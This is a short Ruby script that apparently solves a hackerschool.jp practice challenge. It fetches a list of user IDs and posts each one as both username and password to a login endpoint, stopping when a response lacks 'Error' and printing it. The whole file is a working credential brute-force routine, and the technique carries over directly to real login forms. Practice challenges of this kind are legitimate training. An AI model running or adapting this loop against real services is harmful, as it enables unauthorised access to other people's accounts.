#!/usr/bin/ruby
require 'net/http'
uri=URI.parse('http://www.hackerschool.jp/hack/take55_id_data.txt')
list=[]
Net::HTTP.start(uri.host){|http|
	list=http.get(uri.path).body.strip.split("\n")
}
uri=URI.parse('http://www.hackerschool.jp/hack/take55_attack.php')
Net::HTTP.start(uri.host){|http|
	list.each_with_index{|e,i|
		puts e+' '+i.to_s
		body=http.post(uri.path,'id='+e+'&pass='+e).body
		unless body=~/Error/
			puts body
			break
		end
		#sleep()
	}
}